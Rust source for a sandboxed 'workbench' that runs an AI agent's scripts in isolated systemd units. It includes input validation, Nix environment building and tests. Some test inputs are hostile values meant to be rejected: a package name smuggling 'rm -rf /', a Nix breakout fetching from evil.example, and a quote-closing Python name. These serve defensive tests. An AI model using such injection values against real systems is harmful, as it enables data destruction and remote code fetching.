//! The workbench: a place where Woody runs real programs.
//!
//! `work.run` runs a script as the unprivileged user `woody-work`, in a
//! transient systemd unit of its own. The script sees its own folder and the
//! system's programs, and nothing else of the machine: not Woody's mind, not
//! the HUD, not the logs, not the API key. It has no network unless the
//! request asks for it, and then only public addresses (a firewall rule on
//! that user, in nix/locked/executor.nix).
//!
//! Programs that are not installed are named in the request (`packages`,
//! `python`) and prepared from the system's pinned package set by a first,
//! separate unit that runs only a command built here. The script itself never
//! talks to the Nix daemon: that daemon can reach the network, and a run
//! without network must have no way out at all.
//!
//! What a run prints is untrusted data, like every other tool result.

use crate::config::{Config, Work};
use crate::util::{now_ms, random_id, sha256_hex};
use serde_json::{json, Map, Value};
use std::os::unix::fs::PermissionsExt;
use std::process::Command;
use std::sync::Mutex;

const MAX_SCRIPT: usize = 64 * 1024;
const MAX_OUTPUT: usize = 200_000;
const MAX_PACKAGES: usize = 12;
const MAX_PYTHON: usize = 24;
const DEFAULT_TIMEOUT_S: u64 = 60;
const MAX_TIMEOUT_S: u64 = 600;
/// How long preparing the named programs may take (a first use downloads them).
const PREPARE_TIMEOUT_S: u64 = 600;

/// One run at a time: they share one folder, one processor budget and one memory budget.
static RUNNING: Mutex<()> = Mutex::new(());

#[derive(Debug, Clone, PartialEq)]
pub struct Request {
    pub script: String,
    pub packages: Vec<String>,
    pub python: Vec<String>,
    pub network: bool,
    pub timeout_s: u64,
}

fn settings(cfg: &Config) -> Result<&Work, String> {
    cfg.work.as_ref().ok_or_else(|| "the workbench is not configured on this system".to_string())
}

/// A package of the pinned set, by its attribute name: "ffmpeg", "python3", "imagemagick", "nodePackages.prettier".
fn valid_package(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 80
        && name.split('.').all(|part| {
            let mut chars = part.chars();
            matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
                && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
        })
}

/// A Python library, by its name in the package set: "numpy", "pandas", "pillow".
fn valid_python(name: &str) -> bool {
    let mut chars = name.chars();
    name.len() <= 60
        && matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
}

fn names(map: &Map<String, Value>, key: &str, max: usize, valid: fn(&str) -> bool) -> Result<Vec<String>, String> {
    let Some(v) = map.get(key) else { return Ok(vec![]) };
    if v.is_null() {
        return Ok(vec![]);
    }
    let list = v.as_array().ok_or_else(|| format!("{key} must be a list of names"))?;
    if list.len() > max {
        return Err(format!("{key}: at most {max} names"));
    }
    let mut out = Vec::new();
    for item in list {
        let name = item.as_str().ok_or_else(|| format!("{key} must be a list of names"))?;
        if !valid(name) {
            return Err(format!("{key}: \"{}\" is not a plain package name", name.chars().take(60).collect::<String>()));
        }
        if !out.iter().any(|n| n == name) {
            out.push(name.to_string());
        }
    }
    Ok(out)
}

pub fn parse(map: &Map<String, Value>) -> Result<Request, String> {
    if let Some(k) = map.keys().find(|k| !["script", "packages", "python", "network", "timeout_s"].contains(&k.as_str())) {
        return Err(format!("unknown parameter: {k}"));
    }
    let script = map.get("script").and_then(Value::as_str).ok_or("missing parameter: script")?;
    if script.trim().is_empty() {
        return Err("script is empty".into());
    }
    if script.len() > MAX_SCRIPT {
        return Err(format!("script is limited to {MAX_SCRIPT} bytes; put longer programs in a file in the workbench and run that"));
    }
    if script.contains('\0') {
        return Err("script contains a NUL byte".into());
    }
    let network = match map.get("network") {
        None | Some(Value::Null) => false,
        Some(Value::Bool(b)) => *b,
        Some(_) => return Err("network must be true or false".into()),
    };
    let timeout_s = match map.get("timeout_s") {
        None | Some(Value::Null) => DEFAULT_TIMEOUT_S,
        Some(v) => match v.as_u64() {
            Some(n) if (1..=MAX_TIMEOUT_S).contains(&n) => n,
            _ => return Err(format!("timeout_s must be 1..{MAX_TIMEOUT_S}")),
        },
    };
    Ok(Request {
        script: script.to_string(),
        packages: names(map, "packages", MAX_PACKAGES, valid_package)?,
        python: names(map, "python", MAX_PYTHON, valid_python)?,
        network,
        timeout_s,
    })
}

/// Parameters as they are written to the audit log: the script by its hash, its size and its beginning.
pub fn audit_params(params: &Value) -> Value {
    let mut out = params.clone();
    if let Some(script) = params.get("script").and_then(Value::as_str) {
        let head: String = script.chars().take(2000).collect();
        out["script"] = json!({ "sha256": sha256_hex(script.as_bytes()), "bytes": script.len(), "head": head });
    }
    out
}

/// The Nix expression for the programs a run names: one environment holding
/// them all, taken from the package set this system was built from. The
/// names were validated, so nothing in them can end the expression.
pub fn nix_expr(packages: &[String], python: &[String]) -> String {
    let mut paths: Vec<String> = packages.iter().map(|p| format!("p.{p}")).collect();
    if !python.is_empty() {
        let libs: Vec<String> = python.iter().map(|l| format!("ps.\"{l}\"")).collect();
        paths.push(format!("(p.python3.withPackages (ps: [ {} ]))", libs.join(" ")));
    }
    // No "$" anywhere in it: systemd replaces ${...} in the command of a unit, and would empty it.
    format!(
        "let p = builtins.getAttr builtins.currentSystem (builtins.getFlake \"nixpkgs\").legacyPackages; in p.buildEnv {{ name = \"workbench-env\"; paths = [ {} ]; }}",
        paths.join(" ")
    )
}

/// How systemd says a unit ended ("success", "exit-code", "oom-kill", "timeout", "signal"),
/// read from the summary systemd-run prints when the unit is finished.
pub fn unit_result(stderr: &str) -> Option<String> {
    stderr.lines().find_map(|l| l.trim().strip_prefix("Finished with result: ").map(|r| r.trim().to_string()))
}

/// The summary lines systemd-run adds are not trouble; anything else on its stderr is.
fn own_trouble(stderr: &str) -> String {
    const SUMMARY: &[&str] = &["Running as unit:", "Finished with result:", "Main processes terminated with:", "Service runtime:", "CPU time consumed:", "Memory peak:", "Memory swap peak:", "IP traffic", "IO bytes"];
    stderr.lines().map(str::trim).filter(|l| !l.is_empty() && !SUMMARY.iter().any(|s| l.starts_with(s))).collect::<Vec<_>>().join(" ")
}

/// The properties of the transient unit a step runs in.
///
/// `user_code` is the run of the script itself: it may get the network, and
/// it never gets the Nix daemon or the name-service daemon (both can reach
/// the network on a caller's behalf).
pub fn unit_properties(w: &Work, network: bool, user_code: bool, max_s: u64) -> Vec<String> {
    let mut p: Vec<String> = vec![
        format!("User={}", w.user),
        format!("Group={}", w.user),
        format!("WorkingDirectory={}", w.dir),
        "UMask=0007".into(),
        // Nothing of the machine is writable, and nothing under /var exists except the workbench.
        "ProtectSystem=strict".into(),
        "TemporaryFileSystem=/var:ro".into(),
        format!("BindPaths={}", w.root),
        "ProtectHome=yes".into(),
        "PrivateTmp=yes".into(),
        "PrivateDevices=yes".into(),
        "ProtectProc=invisible".into(),
        "ProcSubset=pid".into(),
        // No way to gain a right.
        "NoNewPrivileges=yes".into(),
        "CapabilityBoundingSet=".into(),
        "AmbientCapabilities=".into(),
        "RestrictSUIDSGID=yes".into(),
        "ProtectKernelTunables=yes".into(),
        "ProtectKernelModules=yes".into(),
        "ProtectKernelLogs=yes".into(),
        "ProtectControlGroups=yes".into(),
        "ProtectClock=yes".into(),
        "ProtectHostname=yes".into(),
        "LockPersonality=yes".into(),
        "RestrictRealtime=yes".into(),
        "RestrictNamespaces=yes".into(),
        "RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6".into(),
        // What it may use.
        format!("RuntimeMaxSec={max_s}"),
        format!("MemoryMax={}", w.memory_max),
        "MemorySwapMax=0".into(),
        "TasksMax=512".into(),
        "CPUQuota=300%".into(),
        "LimitCORE=0".into(),
        "KillMode=control-group".into(),
    ];
    if !(network && user_code) {
        p.push("PrivateNetwork=yes".into());
    }
    for path in &w.hidden {
        p.push(format!("InaccessiblePaths=-{path}"));
    }
    if user_code {
        // The script's own code never reaches a daemon that can use the network for it.
        p.push("InaccessiblePaths=-/nix/var/nix/daemon-socket".into());
        p.push("InaccessiblePaths=-/run/nscd".into());
    }
    p
}

fn environment(w: &Work, extra_path: Option<&str>) -> Vec<String> {
    let mut path = w.path.join(":");
    if let Some(p) = extra_path {
        path = format!("{p}/bin:{path}");
    }
    vec![
        format!("PATH={path}"),
        format!("HOME={}", w.home),
        format!("TMPDIR={}/tmp", w.home),
        "LANG=C.UTF-8".into(),
        // No registry is fetched from the network: "nixpkgs" is the package set this system was built from.
        "NIX_CONFIG=experimental-features = nix-command flakes\nflake-registry = ".into(),
        format!("SSL_CERT_FILE={}", w.ca_bundle),
        format!("NIX_SSL_CERT_FILE={}", w.ca_bundle),
    ]
}

struct Ran {
    code: i32,
    stdout: Vec<u8>,
    stderr: String,
    seconds: f64,
}

fn run_unit(w: &Work, name: &str, properties: &[String], env: &[String], command: &[&str], hard_timeout_s: u64) -> Result<Ran, String> {
    let started = now_ms();
    let mut cmd = Command::new(&w.timeout);
    cmd.arg("--kill-after=10").arg(hard_timeout_s.to_string()).arg(&w.systemd_run);
    // Without --quiet: systemd-run then says on its stderr how the unit ended (see unit_result).
    cmd.args(["--wait", "--pipe", "--collect", "--unit", name]);
    for p in properties {
        cmd.arg("-p").arg(p);
    }
    for e in env {
        cmd.arg(format!("--setenv={e}"));
    }
    cmd.arg("--").args(command);
    let out = cmd.env_clear().env("LC_ALL", "C").stdin(std::process::Stdio::null()).output().map_err(|e| format!("spawn systemd-run: {e}"))?;
    Ok(Ran {
        code: out.status.code().unwrap_or(-1),
        stdout: out.stdout,
        stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
        seconds: (now_ms().saturating_sub(started)) as f64 / 1000.0,
    })
}

fn write_script(path: &str, body: &str) -> Result<(), String> {
    std::fs::write(path, body).map_err(|e| format!("write {path}: {e}"))?;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o644)).map_err(|e| format!("chmod {path}: {e}"))
}

fn tail(text: &str, max: usize) -> String {
    let t = text.trim();
    if t.len() <= max {
        return t.to_string();
    }
    let mut cut = t.len() - max;
    while !t.is_char_boundary(cut) {
        cut += 1;
    }
    format!("…{}", &t[cut..])
}

/// Everything a wrapper script needs to quote is a path made here, from an id of hex digits.
fn wrapper(w: &Work, user_script: &str, timeout_s: u64) -> String {
    format!(
        "set -o pipefail\nmkdir -p \"$TMPDIR\"\ncd '{dir}' || exit 97\n{timeout} --signal=TERM --kill-after=5 {timeout_s} {bash} '{user_script}' 2>&1 | {head} -c {limit}\nexit ${{PIPESTATUS[0]}}\n",
        dir = w.dir,
        timeout = w.timeout,
        bash = w.bash,
        head = w.head,
        limit = MAX_OUTPUT + 1,
    )
}

pub fn run(cfg: &Config, map: &Map<String, Value>) -> Result<Value, String> {
    let w = settings(cfg)?;
    let req = parse(map)?;
    let _one = RUNNING.lock().unwrap_or_else(|e| e.into_inner());
    if !std::path::Path::new(&w.dir).is_dir() {
        return Err("the workbench's folder is not there (the woody-work-bench service did not start)".into());
    }
    let id = random_id().map_err(|e| format!("random: {e}"))?;
    let id = &id[..16.min(id.len())];
    let user_script = format!("{}/{id}.user.sh", w.run_dir);
    let wrapper_script = format!("{}/{id}.sh", w.run_dir);
    let cleanup = || {
        let _ = std::fs::remove_file(&user_script);
        let _ = std::fs::remove_file(&wrapper_script);
    };

    // 1. The programs the run names, prepared by a command made here.
    let mut env_path: Option<String> = None;
    let mut prepare_s = 0.0;
    if !req.packages.is_empty() || !req.python.is_empty() {
        let expr = nix_expr(&req.packages, &req.python);
        let props = unit_properties(w, false, false, PREPARE_TIMEOUT_S);
        let ran = run_unit(
            w,
            &format!("woody-work-prepare-{id}"),
            &props,
            &environment(w, None),
            &[w.nix.as_str(), "build", "--impure", "--no-link", "--print-out-paths", "--expr", &expr],
            PREPARE_TIMEOUT_S + 30,
        )?;
        prepare_s = ran.seconds;
        let path = String::from_utf8_lossy(&ran.stdout).trim().to_string();
        if ran.code != 0 || !path.starts_with("/nix/store/") || path.contains(char::is_whitespace) {
            return Err(format!(
                "the programs could not be prepared (packages: {}; python: {}). Check the names against the package set. What Nix said: {}",
                req.packages.join(", "),
                req.python.join(", "),
                tail(&own_trouble(&ran.stderr), 1200)
            ));
        }
        env_path = Some(path);
    }

    // 2. The script itself.
    write_script(&user_script, &req.script)?;
    write_script(&wrapper_script, &wrapper(w, &user_script, req.timeout_s))?;
    let props = unit_properties(w, req.network, true, req.timeout_s + 30);
    let ran = run_unit(
        w,
        &format!("woody-work-{id}"),
        &props,
        &environment(w, env_path.as_deref()),
        &[w.bash.as_str(), wrapper_script.as_str()],
        req.timeout_s + 60,
    );
    cleanup();
    let ran = ran?;

    let cut = ran.stdout.len() > MAX_OUTPUT;
    let shown = &ran.stdout[..ran.stdout.len().min(MAX_OUTPUT)];
    let result = unit_result(&ran.stderr);
    // The memory limit ends the whole unit at once: the script gets no chance to say anything.
    let out_of_memory = result.as_deref() == Some("oom-kill");
    let timed_out = !out_of_memory && (ran.code == 124 || result.as_deref() == Some("timeout") || ran.seconds >= req.timeout_s as f64);
    // systemd-run reports its own trouble (a property it does not know, a unit that could not start) on stderr.
    let own = own_trouble(&ran.stderr);
    let trouble = if ran.code != 0 && !own.is_empty() { Some(tail(&own, 600)) } else { None };
    Ok(json!({
        "exit_code": ran.code,
        "output": String::from_utf8_lossy(shown),
        "output_cut": cut,
        "timed_out": timed_out,
        "out_of_memory": out_of_memory,
        "seconds": (ran.seconds * 10.0).round() / 10.0,
        "prepare_seconds": (prepare_s * 10.0).round() / 10.0,
        "network": req.network,
        "trouble": trouble,
        "untrusted": true,
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn params(v: Value) -> Map<String, Value> {
        v.as_object().unwrap().clone()
    }

    fn work() -> Work {
        serde_json::from_value(json!({
            "user": "woody-work", "root": "/var/lib/woody-work", "dir": "/var/lib/woody-work/files",
            "home": "/var/lib/woody-work/home", "run_dir": "/var/lib/woody-work/run",
            "systemd_run": "/bin/systemd-run", "bash": "/bin/bash", "nix": "/bin/nix", "timeout": "/bin/timeout", "head": "/bin/head",
            "ca_bundle": "/etc/ssl/certs/ca-certificates.crt",
            "path": ["/a/bin", "/b/bin"], "hidden": ["/run/woody", "/run/woody-agent"],
        }))
        .unwrap()
    }

    #[test]
    fn requests_are_validated() {
        let ok = parse(&params(json!({ "script": "echo hi" }))).unwrap();
        assert_eq!(ok, Request { script: "echo hi".into(), packages: vec![], python: vec![], network: false, timeout_s: 60 });
        let full = parse(&params(json!({
            "script": "ffmpeg -version", "packages": ["ffmpeg", "nodePackages.prettier", "ffmpeg"], "python": ["numpy"], "network": true, "timeout_s": 300
        })))
        .unwrap();
        assert_eq!(full.packages, vec!["ffmpeg", "nodePackages.prettier"]);
        assert_eq!(full.python, vec!["numpy"]);
        assert!(full.network);
        assert_eq!(full.timeout_s, 300);

        for bad in [
            json!({}),
            json!({ "script": "  " }),
            json!({ "script": "x", "shell": "sh" }),
            json!({ "script": "x", "timeout_s": 601 }),
            json!({ "script": "x", "timeout_s": 0 }),
            json!({ "script": "x", "network": "yes" }),
            json!({ "script": "x", "packages": "ffmpeg" }),
            json!({ "script": "x", "packages": ["ffmpeg; rm -rf /"] }),
            json!({ "script": "x", "packages": ["a b"] }),
            json!({ "script": "x", "packages": ["\"; builtins.fetchurl \"https://evil.example"] }),
            json!({ "script": "x", "packages": ["github:someone/flake"] }),
            json!({ "script": "x", "packages": ["../x"] }),
            json!({ "script": "x", "packages": [".x"] }),
            json!({ "script": "x", "python": ["numpy\"]) ; ("] }),
            json!({ "script": "x", "python": ["a.b"] }),
            json!({ "script": "x".repeat(MAX_SCRIPT + 1) }),
        ] {
            assert!(parse(&params(bad.clone())).is_err(), "{bad}");
        }
        assert!(parse(&params(json!({ "script": "x", "packages": (0..13).map(|i| format!("p{i}")).collect::<Vec<_>>() }))).is_err());
    }

    #[test]
    fn the_expression_names_only_packages_of_the_pinned_set() {
        let e = nix_expr(&["ffmpeg".into(), "jq".into()], &["numpy".into(), "scikit-learn".into()]);
        assert!(e.contains("builtins.getFlake \"nixpkgs\""));
        // systemd would replace anything written with a dollar sign in a unit's command.
        assert!(!e.contains('$'));
        assert_eq!(unit_result("Running as unit: x.service
Finished with result: oom-kill
Memory peak: 2G
").as_deref(), Some("oom-kill"));
        assert_eq!(unit_result("nothing of the kind"), None);
        assert_eq!(own_trouble("Running as unit: x.service
Finished with result: exit-code
Main processes terminated with: code=exited/status=1
Service runtime: 1s
CPU time consumed: 10ms
Memory peak: 1M
"), "");
        assert_eq!(own_trouble("Unknown assignment: Foo=bar
Finished with result: success"), "Unknown assignment: Foo=bar");
        assert!(e.contains("paths = [ p.ffmpeg p.jq (p.python3.withPackages (ps: [ ps.\"numpy\" ps.\"scikit-learn\" ])) ]"));
        assert_eq!(nix_expr(&["jq".into()], &[]).matches("python3").count(), 0);
    }

    #[test]
    fn a_run_has_no_network_unless_asked_and_its_code_never_reaches_a_daemon() {
        let w = work();
        let offline = unit_properties(&w, false, true, 90);
        assert!(offline.contains(&"PrivateNetwork=yes".to_string()));
        assert!(offline.contains(&"InaccessiblePaths=-/nix/var/nix/daemon-socket".to_string()));
        assert!(offline.contains(&"InaccessiblePaths=-/run/nscd".to_string()));
        assert!(offline.contains(&"InaccessiblePaths=-/run/woody".to_string()));
        assert!(offline.contains(&"User=woody-work".to_string()));
        assert!(offline.contains(&"TemporaryFileSystem=/var:ro".to_string()));
        assert!(offline.contains(&"BindPaths=/var/lib/woody-work".to_string()));
        assert!(offline.contains(&"NoNewPrivileges=yes".to_string()));
        assert!(offline.contains(&"CapabilityBoundingSet=".to_string()));
        assert!(offline.contains(&"RuntimeMaxSec=90".to_string()));

        let online = unit_properties(&w, true, true, 90);
        assert!(!online.contains(&"PrivateNetwork=yes".to_string()));
        assert!(online.contains(&"InaccessiblePaths=-/nix/var/nix/daemon-socket".to_string()));

        // Preparing the programs: the Nix daemon is needed, the network never is, whatever the run asked for.
        let prepare = unit_properties(&w, true, false, 600);
        assert!(prepare.contains(&"PrivateNetwork=yes".to_string()));
        assert!(!prepare.iter().any(|p| p.contains("daemon-socket")));
    }

    #[test]
    fn the_wrapper_bounds_time_and_output_and_keeps_the_exit_code() {
        let w = work();
        let s = wrapper(&w, "/var/lib/woody-work/run/abc.user.sh", 45);
        assert!(s.contains("/bin/timeout --signal=TERM --kill-after=5 45 /bin/bash '/var/lib/woody-work/run/abc.user.sh' 2>&1 | /bin/head -c 200001"));
        assert!(s.contains("exit ${PIPESTATUS[0]}"));
        assert!(s.contains("cd '/var/lib/woody-work/files'"));
        let env = environment(&w, Some("/nix/store/xyz-workbench-env"));
        assert_eq!(env[0], "PATH=/nix/store/xyz-workbench-env/bin:/a/bin:/b/bin");
        assert!(env.contains(&"HOME=/var/lib/woody-work/home".to_string()));
    }

    #[test]
    fn the_audit_log_keeps_the_script_by_its_hash_and_its_beginning() {
        let long = "echo line\n".repeat(1000);
        let a = audit_params(&json!({ "script": long, "network": true }));
        assert_eq!(a["script"]["bytes"], 10_000);
        assert_eq!(a["script"]["head"].as_str().unwrap().len(), 2000);
        assert_eq!(a["script"]["sha256"].as_str().unwrap().len(), 64);
        assert_eq!(a["network"], true);
    }
}
